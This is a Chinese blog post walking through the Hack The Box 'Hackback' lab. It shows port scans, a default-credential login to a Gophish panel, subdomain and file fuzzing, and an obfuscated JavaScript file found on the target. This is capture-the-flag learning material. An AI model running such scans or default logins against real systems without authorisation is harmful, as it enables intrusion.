<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>对Hackback的测试 | 梦梦安全</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="Hackback靶机：10.10.10.128kali：10.10.15.83实验目的：找到flag项目地址：https://www.hackthebox.eu/home/machines/profile/176">
<meta name="keywords" content="安全测试,靶机实验">
<meta property="og:type" content="article">
<meta property="og:title" content="对Hackback的测试">
<meta property="og:url" content="http://www.lanbainan.cn/2019/07/14/2019-07-14/index.html">
<meta property="og:site_name" content="梦梦安全">
<meta property="og:description" content="Hackback靶机：10.10.10.128kali：10.10.15.83实验目的：找到flag项目地址：https://www.hackthebox.eu/home/machines/profile/176">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="https://i.loli.net/2019/07/14/5d2ae27f5ecef26520.png">
<meta property="og:image" content="https://i.loli.net/2019/07/14/5d2ae73e9c62419386.png">
<meta property="og:image" content="https://i.loli.net/2019/07/14/5d2af0850bee535210.png">
<meta property="og:image" content="https://i.loli.net/2019/07/14/5d2af146e60ac62725.png">
<meta property="og:image" content="https://i.loli.net/2019/07/14/5d2af1de127d919734.png">
<meta property="og:image" content="https://i.loli.net/2019/07/14/5d2af6983e80a81834.png">
<meta property="og:image" content="https://i.loli.net/2019/07/14/5d2afa89bbecc51544.png">
<meta property="og:image" content="https://i.loli.net/2019/07/14/5d2b0fa4a446e54147.png">
<meta property="og:image" content="https://i.loli.net/2019/07/14/5d2b49547b14b51058.png">
<meta property="og:image" content="https://i.loli.net/2019/07/14/5d2b4cf576f0843908.png">
<meta property="og:image" content="https://i.loli.net/2019/07/15/5d2b56b784c7f57856.png">
<meta property="og:image" content="https://i.loli.net/2019/07/16/5d2d44ed5f57d64524.png">
<meta property="og:updated_time" content="2019-07-23T05:46:49.075Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="对Hackback的测试">
<meta name="twitter:description" content="Hackback靶机：10.10.10.128kali：10.10.15.83实验目的：找到flag项目地址：https://www.hackthebox.eu/home/machines/profile/176">
<meta name="twitter:image" content="https://i.loli.net/2019/07/14/5d2ae27f5ecef26520.png">
  
  
    <link rel="icon" href="/img/830.jpg">
  
  
  <link rel="stylesheet" href="/css/style.css">
  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
  
  
      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  
  <!-- 加载特效 -->
    <script src="/js/pace.js"></script>
    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
  <script>
      var yiliaConfig = {
          rootUrl: '/',
          fancybox: true,
          animate: false,
          isHome: false,
          isPost: true,
          isArchive: false,
          isTag: false,
          isCategory: false,
          open_in_new: false
      }
  </script>
<script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css"/>
</head>

<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        <a href="/" class="profilepic">
            
            <img src="/img/831.jpg" class="js-avatar" style="width: 100%;height: 100%;opacity: 1;">
            
        </a>

        <hgroup>
          <h1 class="header-author"><a href="/" title="Hi Mate">EV</a></h1>
        </hgroup>

        
        <p class="header-subtitle">只要没完蛋，就还可以继续。</p>
        
        
        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        <div class="icon-wrap icon-link hide" data-idx="2">
                            <div class="loopback_l"></div>
                            <div class="loopback_r"></div>
                        </div>
                        
                        
                        <div class="icon-wrap icon-me hide" data-idx="3">
                            <div class="user"></div>
                            <div class="shoulder"></div>
                        </div>
                        
                    </div>
                    
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>菜单</li>
                        <li>标签</li>
                        
                        <li>友情链接</li>
                        
                        
                        <li>关于我</li>
                        
                    </ul>
                </div>
            </div>
        

        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a href="/">博客首页</a></li>
                        
                            <li><a href="/categories/信息安全">信息安全</a></li>
                        
                            <li><a href="/categories/python">python</a></li>
                        
                            <li><a href="/categories/杂项">杂项</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fl mail" target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=6oaLhIiLg46PnouEhouEjaqbm8SJhYc" title="mail">mail</a>
                            
                                <a class="fl github" target="_blank" href="https://github.com/lanbainan" title="github">github</a>
                            
                                <a class="fl zhihu" target="_blank" href="https://www.zhihu.com/people/lan-bai-83-69/activities" title="zhihu">zhihu</a>
                            
                                <a class="fl rss" target="_blank" href="/atom.xml" title="rss">rss</a>
                            
                        </ul>
                    </nav>
                </section>
                
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        <a href="/tags/ARP/" style="font-size: 10px;">ARP</a> <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/DDOS/" style="font-size: 10px;">DDOS</a> <a href="/tags/Sql注入/" style="font-size: 10px;">Sql注入</a> <a href="/tags/Windows/" style="font-size: 13.33px;">Windows</a> <a href="/tags/hexo/" style="font-size: 11.67px;">hexo</a> <a href="/tags/linux/" style="font-size: 15px;">linux</a> <a href="/tags/python/" style="font-size: 13.33px;">python</a> <a href="/tags/内网游行/" style="font-size: 10px;">内网游行</a> <a href="/tags/复现/" style="font-size: 10px;">复现</a> <a href="/tags/安全测试/" style="font-size: 20px;">安全测试</a> <a href="/tags/安防/" style="font-size: 10px;">安防</a> <a href="/tags/密码学/" style="font-size: 11.67px;">密码学</a> <a href="/tags/工具/" style="font-size: 16.67px;">工具</a> <a href="/tags/爬虫/" style="font-size: 11.67px;">爬虫</a> <a href="/tags/登录框/" style="font-size: 10px;">登录框</a> <a href="/tags/防火墙/" style="font-size: 10px;">防火墙</a> <a href="/tags/随笔/" style="font-size: 10px;">随笔</a> <a href="/tags/靶机实验/" style="font-size: 18.33px;">靶机实验</a>
                    </div>
                </section>
                
                
                
                <section class="switch-part switch-part3">
                    <div id="js-friends">
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://3as0n.cn">3as0师傅</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://www.hexlt.org/">脱发师傅</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://www.54loli.cn">忆梦小站</a>
                    
                    </div>
                </section>
                

                
                
                <section class="switch-part switch-part4">
                
                    <div id="js-aboutme">励志成为一个职业吹牛大王</div>
                </section>
                
            </div>
        </div>
    </header>                
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me">EV</a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                
                    <img src="/img/831.jpg" class="js-avatar" style="width: 100%; height: 100%; opacity: 1;">
                
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="Me">EV</a></h1>
            </hgroup>
            
            <p class="header-subtitle">只要没完蛋，就还可以继续。</p>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="/">博客首页</a></li>
                
                    <li><a href="/categories/信息安全">信息安全</a></li>
                
                    <li><a href="/categories/python">python</a></li>
                
                    <li><a href="/categories/杂项">杂项</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                <div class="social">
                    
                        <a class="mail" target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=6oaLhIiLg46PnouEhouEjaqbm8SJhYc" title="mail">mail</a>
                    
                        <a class="github" target="_blank" href="https://github.com/lanbainan" title="github">github</a>
                    
                        <a class="zhihu" target="_blank" href="https://www.zhihu.com/people/lan-bai-83-69/activities" title="zhihu">zhihu</a>
                    
                        <a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
                    
                </div>
            </nav>
        </header>                
    </div>
</nav>
      <div class="body-wrap"><article id="post-2019-07-14" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/07/14/2019-07-14/" class="article-date">
      <time datetime="2019-07-14T07:58:00.000Z" itemprop="datePublished">2019-07-14</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      对Hackback的测试
    </h1>
  

      
      </header>
      
      <div class="article-info article-info-post">
        
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/信息安全/">信息安全</a>
    </div>


        
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/安全测试/">安全测试</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/靶机实验/">靶机实验</a></li></ul>
    </div>

        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h1 id="Hackback"><a href="#Hackback" class="headerlink" title="Hackback"></a>Hackback</h1><p>靶机：10.10.10.128<br>kali：10.10.15.83<br>实验目的：找到flag<br>项目地址：<a href="https://www.hackthebox.eu/home/machines/profile/176" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/profile/176</a><br><a id="more"></a></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>masscan、nmap大法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# masscan -e tun0 -p1-65535 10.10.10.128 --rate=2000</span><br><span class="line">Discovered open port 64831/tcp on 10.10.10.128</span><br><span class="line">Discovered open port 80/tcp on 10.10.10.128</span><br><span class="line">Discovered open port 6666/tcp on 10.10.10.128</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -T4 -A -v -p80,6666,64831 10.10.10.128</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">80/tcp   open  http    Microsoft IIS httpd 10.0</span><br><span class="line">| http-methods:</span><br><span class="line">|   Supported Methods: OPTIONS TRACE GET HEAD POST</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: IIS Windows Server</span><br><span class="line">6666/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Site doesnt have a title.</span><br><span class="line">64831/tcp open  ssl/unknown</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   FourOhFourRequest:</span><br><span class="line">|     HTTP/1.0 404 Not Found</span><br><span class="line">|     Content-Type: text/plain; charset=utf-8</span><br><span class="line">|     Set-Cookie: _gorilla_csrf=MTU2MzExNzUyMnxJblZaU201bFJ6SkNNM0EyVGpWM1JGVXljbkpzVlZaVU9XdGhVMmxFUkZoRU1uUlVjVVpaTlZkaGJFazlJZ289fHoXSViyQX7JMh2ssjivT-w2ie4GljJeBBDraE3CxtFj; HttpOnly; Secure</span><br><span class="line">|     Vary: Accept-Encoding</span><br><span class="line">|     Vary: Cookie</span><br><span class="line">|     X-Content-Type-Options: nosniff</span><br><span class="line">|     Date: Sun, 14 Jul 2019 15:18:42 GMT</span><br><span class="line">|     Content-Length: 19</span><br><span class="line">|     page not found</span><br><span class="line">|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq:</span><br><span class="line">|     HTTP/1.1 400 Bad Request</span><br><span class="line">|     Content-Type: text/plain; charset=utf-8</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Request</span><br><span class="line">|   GetRequest:</span><br><span class="line">|     HTTP/1.0 302 Found</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Location: /login?next=%2F</span><br><span class="line">|     Set-Cookie: _gorilla_csrf=MTU2MzExNzQ4N3xJbTVRYW5vMlNVNVRjV2gzVEdjMWRXODJWR1pZZWk4MWF6SXJiblJRWkZCNEt6WnVSVEJDUzNOWU5tTTlJZ289fHM9UmUFieLG1PlH4n-LguBPZFhXuWIXVHODube95gkf; HttpOnly; Secure</span><br><span class="line">|     Vary: Accept-Encoding</span><br><span class="line">|     Vary: Cookie</span><br><span class="line">|     Date: Sun, 14 Jul 2019 15:18:07 GMT</span><br><span class="line">|     Content-Length: 38</span><br><span class="line">|     href=&quot;/login?next=%2F&quot;&gt;Found&lt;/a&gt;.</span><br><span class="line">|   HTTPOptions:</span><br><span class="line">|     HTTP/1.0 302 Found</span><br><span class="line">|     Location: /login?next=%2F</span><br><span class="line">|     Set-Cookie: _gorilla_csrf=MTU2MzExNzQ4OHxJbXRLYWpjMFlsY3pia2h0WTBsWWNVOTFZa3hyUjBNcmIyUTRNemxMWkVvNFZtaFVPVFZUZFVkamFrRTlJZ289fPlPo9jtOy7SCPPtw6lWQMnAU8hlLEcxaIZxwfiiz1L5; HttpOnly; Secure</span><br><span class="line">|     Vary: Accept-Encoding</span><br><span class="line">|     Vary: Cookie</span><br><span class="line">|     Date: Sun, 14 Jul 2019 15:18:08 GMT</span><br><span class="line">|_    Content-Length: 0</span><br><span class="line">| ssl-cert: Subject: organizationName=Gophish</span><br><span class="line">| Issuer: organizationName=Gophish</span><br><span class="line">| Public Key type: ec</span><br><span class="line">| Public Key bits: 384</span><br><span class="line">| Signature Algorithm: ecdsa-with-SHA384</span><br><span class="line">| Not valid before: 2018-11-22T03:49:52</span><br><span class="line">| Not valid after:  2028-11-19T03:49:52</span><br><span class="line">| MD5:   a00e abee 5be1 2925 7276 a5d7 df2f c1b4</span><br><span class="line">|_SHA-1: 1124 a9ee 28ba 3656 312e a925 c6ea 3010 be63 d1af</span><br></pre></td></tr></table></figure>
<p>80端口的一头驴<br><img src="https://i.loli.net/2019/07/14/5d2ae27f5ecef26520.png" alt="1.png"><br>6666端口<br><img src="https://i.loli.net/2019/07/14/5d2ae73e9c62419386.png" alt="2.png"><br>64831端口，开着ssl，运行Gophish<br><img src="https://i.loli.net/2019/07/14/5d2af0850bee535210.png" alt="3.png"></p>
<h2 id="测试ing"><a href="#测试ing" class="headerlink" title="测试ing"></a>测试ing</h2><p>根据提示，测试命令，返回当前可用参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# curl http://10.10.10.128:6666/help</span><br><span class="line">&quot;hello,proc,whoami,list,info,services,netsat,ipconfig&quot;</span><br></pre></td></tr></table></figure></p>
<p>能够使用默认口令登录Gophish<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin/gophish</span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2019/07/14/5d2af146e60ac62725.png" alt="4.png"><br>仅有的信息<br><img src="https://i.loli.net/2019/07/14/5d2af1de127d919734.png" alt="5.png"><br>从模板中，发现了有趣的东西<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;&lt;!-- http://admin.hackback.htb --&gt;&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;You have been awarded with the 1st blood. &lt;a href=&quot;http://www.hackthebox.htb&quot;&gt;Catch it now&lt;/a&gt;!&amp;nbsp; &amp;nbsp;&lt;/p&gt;</span><br></pre></td></tr></table></figure></p>
<p>那么将得到三个域名<code>www.hackthebox.htb</code>，<code>hackthebox.htb</code>和<code>admin.hackback.htb</code>,加入hosts<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.128 www.hackthebox.htb #HTB登录页面</span><br><span class="line">10.10.10.128 hackthebox.htb</span><br><span class="line">10.10.10.128 admin.hackback.htb</span><br></pre></td></tr></table></figure></p>
<p>也可以使用模糊测试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# wfuzz --hc 614 -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1mil-5000.txt -H &quot;HOST: FUZZ.hackback.htb&quot; http://10.10.10.128</span><br></pre></td></tr></table></figure></p>
<h2 id="url测试"><a href="#url测试" class="headerlink" title="url测试"></a>url测试</h2><p>在<code>admin.hackback.htb</code>发现新的登录界面<br><img src="https://i.loli.net/2019/07/14/5d2af6983e80a81834.png" alt="6.png"><br>在html中发现线索<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- &lt;script SRC=&quot;js/.js&quot;&gt;&lt;/script&gt; --&gt;</span><br></pre></td></tr></table></figure></p>
<p>直接访问404,测试js<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# gobuster -q -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowerc ase.txt -x js -u http://admin.hackback.htb/js</span><br><span class="line">/private.js (Status: 200)</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://admin.hackback.htb/js/private.js</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/07/14/5d2afa89bbecc51544.png" alt="7.png"><br>这里使用了凯撒加密，<code>ine n=</code>应该是<code>var x=</code>,这很js。<br>v是第22个字母，而i第9个字母。22 - 9 = 13<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">var a = [&apos;\x57\x78\x49\x6a\x77\x72\x37\x44\x75\x73\x4f\x38\x47\x73\x4b\x76\x52\x77\x42\x2b\x77\x71\x33\x44\x75\x4d\x4b\x72\x77\x72\x4c\x44\x67\x63\x4f\x69\x77\x72\x59\x31\x4b\x45\x45\x67\x47\x38\x4b\x43\x77\x71\x37\x44\x6c\x38\x4b\x33&apos;, &apos;\x41\x63\x4f\x4d\x77\x71\x76\x44\x71\x51\x67\x43\x77\x34\x2f\x43\x74\x32\x6e\x44\x74\x4d\x4b\x68\x5a\x63\x4b\x44\x77\x71\x54\x43\x70\x54\x73\x79\x77\x37\x6e\x43\x68\x73\x4f\x51\x58\x4d\x4f\x35\x57\x38\x4b\x70\x44\x73\x4f\x74\x4e\x43\x44\x44\x76\x41\x6a\x43\x67\x79\x6b\x3d&apos;, &apos;\x77\x35\x48\x44\x72\x38\x4f\x37\x64\x44\x52\x6d\x4d\x4d\x4b\x4a\x77\x34\x6a\x44\x6c\x56\x52\x6e\x77\x72\x74\x37\x77\x37\x73\x30\x77\x6f\x31\x61\x77\x37\x73\x41\x51\x73\x4b\x73\x66\x73\x4f\x45\x77\x34\x58\x44\x73\x52\x6a\x43\x6c\x4d\x4f\x77\x46\x7a\x72\x43\x6d\x7a\x70\x76\x43\x41\x6a\x43\x75\x42\x7a\x44\x73\x73\x4b\x39\x46\x38\x4f\x34\x77\x71\x5a\x6e\x57\x73\x4b\x68&apos;];</span><br><span class="line">(function(c, d) &#123;</span><br><span class="line">    var e = function(f) &#123;</span><br><span class="line">        while (--f) &#123;</span><br><span class="line">            c[&apos;push&apos;](c[&apos;shift&apos;]());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    e(++d);</span><br><span class="line">&#125;(a, 0x66));</span><br><span class="line">var b = function(c, d) &#123;</span><br><span class="line">    c = c - 0x0;</span><br><span class="line">    var e = a[c];</span><br><span class="line">    if (b[&apos;MsULmv&apos;] === undefined) &#123;</span><br><span class="line">        (function() &#123;</span><br><span class="line">            var f;</span><br><span class="line">            try &#123;</span><br><span class="line">                var g = Function(&apos;return\x20(function()\x20&apos; + &apos;&#123;&#125;.constructor(\x22return\x20this\x22)(\x20)&apos; + &apos;);&apos;);</span><br><span class="line">                f = g();</span><br><span class="line">            &#125; catch (h) &#123;</span><br><span class="line">                f = window;</span><br><span class="line">            &#125;</span><br><span class="line">            var i = &apos;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&apos;;</span><br><span class="line">            f[&apos;atob&apos;] || (f[&apos;atob&apos;] = function(j) &#123;</span><br><span class="line">                var k = String(j)[&apos;replace&apos;](/=+$/, &apos;&apos;);</span><br><span class="line">                for (var l = 0x0, m, n, o = 0x0, p = &apos;&apos;; n = k[&apos;charAt&apos;](o++); ~n &amp;&amp; (m = l % 0x4 ? m * 0x40 + n : n, l++ % 0x4) ? p += String[&apos;fromCharCode&apos;](0xff &amp; m &gt;&gt; (-0x2 * l &amp; 0x6)) : 0x0) &#123;</span><br><span class="line">                    n = i[&apos;indexOf&apos;](n);</span><br><span class="line">                &#125;</span><br><span class="line">                return p;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;());</span><br><span class="line">        var q = function(r, d) &#123;</span><br><span class="line">            var t = [],</span><br><span class="line">                u = 0x0,</span><br><span class="line">                v, w = &apos;&apos;,</span><br><span class="line">                x = &apos;&apos;;</span><br><span class="line">            r = atob(r);</span><br><span class="line">            for (var y = 0x0, z = r[&apos;length&apos;]; y &lt; z; y++) &#123;</span><br><span class="line">                x += &apos;%&apos; + (&apos;00&apos; + r[&apos;charCodeAt&apos;](y)[&apos;toString&apos;](0x10))[&apos;slice&apos;](-0x2);</span><br><span class="line">            &#125;</span><br><span class="line">            r = decodeURIComponent(x);</span><br><span class="line">            for (var A = 0x0; A &lt; 0x100; A++) &#123;</span><br><span class="line">                t[A] = A;</span><br><span class="line">            &#125;</span><br><span class="line">            for (A = 0x0; A &lt; 0x100; A++) &#123;</span><br><span class="line">                u = (u + t[A] + d[&apos;charCodeAt&apos;](A % d[&apos;length&apos;])) % 0x100;</span><br><span class="line">                v = t[A];</span><br><span class="line">                t[A] = t[u];</span><br><span class="line">                t[u] = v;</span><br><span class="line">            &#125;</span><br><span class="line">            A = 0x0;</span><br><span class="line">            u = 0x0;</span><br><span class="line">            for (var B = 0x0; B &lt; r[&apos;length&apos;]; B++) &#123;</span><br><span class="line">                A = (A + 0x1) % 0x100;</span><br><span class="line">                u = (u + t[A]) % 0x100;</span><br><span class="line">                v = t[A];</span><br><span class="line">                t[A] = t[u];</span><br><span class="line">                t[u] = v;</span><br><span class="line">                w += String[&apos;fromCharCode&apos;](r[&apos;charCodeAt&apos;](B) ^ t[(t[A] + t[u]) % 0x100]);</span><br><span class="line">            &#125;</span><br><span class="line">            return w;</span><br><span class="line">        &#125;;</span><br><span class="line">        b[&apos;OoACcd&apos;] = q;</span><br><span class="line">        b[&apos;qSLwGk&apos;] = &#123;&#125;;</span><br><span class="line">        b[&apos;MsULmv&apos;] = !![];</span><br><span class="line">    &#125;</span><br><span class="line">    var C = b[&apos;qSLwGk&apos;][c];</span><br><span class="line">    if (C === undefined) &#123;</span><br><span class="line">        if (b[&apos;pIjlQB&apos;] === undefined) &#123;</span><br><span class="line">            b[&apos;pIjlQB&apos;] = !![];</span><br><span class="line">        &#125;</span><br><span class="line">        e = b[&apos;OoACcd&apos;](e, d);</span><br><span class="line">        b[&apos;qSLwGk&apos;][c] = e;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        e = C;</span><br><span class="line">    &#125;</span><br><span class="line">    return e;</span><br><span class="line">&#125;;</span><br><span class="line">var x = &apos;\x53\x65\x63\x75\x72\x65\x20\x4c\x6f\x67\x69\x6e\x20\x42\x79\x70\x61\x73\x73&apos;;</span><br><span class="line">var z = b(&apos;0x0&apos;, &apos;\x50\x5d\x53\x36&apos;);</span><br><span class="line">var h = b(&apos;0x1&apos;, &apos;\x72\x37\x54\x59&apos;);</span><br><span class="line">var y = b(&apos;0x2&apos;, &apos;\x44\x41\x71\x67&apos;);</span><br><span class="line">var t = &apos;\x3f\x61\x63\x74\x69\x6f\x6e\x3d\x28\x73\x68\x6f\x77\x2c\x6c\x69\x73\x74\x2c\x65\x78\x65\x63\x2c\x69\x6e\x69\x74\x29&apos;;</span><br><span class="line">var s = &apos;\x26\x73\x69\x74\x65\x3d\x28\x74\x77\x69\x74\x74\x65\x72\x2c\x70\x61\x79\x70\x61\x6c\x2c\x66\x61\x63\x65\x62\x6f\x6f\x6b\x2c\x68\x61\x63\x6b\x74\x68\x65\x62\x6f\x78\x29&apos;;</span><br><span class="line">var i = &apos;\x26\x70\x61\x73\x73\x77\x6f\x72\x64\x3d\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a&apos;;</span><br><span class="line">var k = &apos;\x26\x73\x65\x73\x73\x69\x6f\x6e\x3d&apos;;</span><br><span class="line">var w = &apos;\x4e\x6f\x74\x68\x69\x6e\x67\x20\x6d\x6f\x72\x65\x20\x74\x6f\x20\x73\x61\x79&apos;;</span><br></pre></td></tr></table></figure></p>
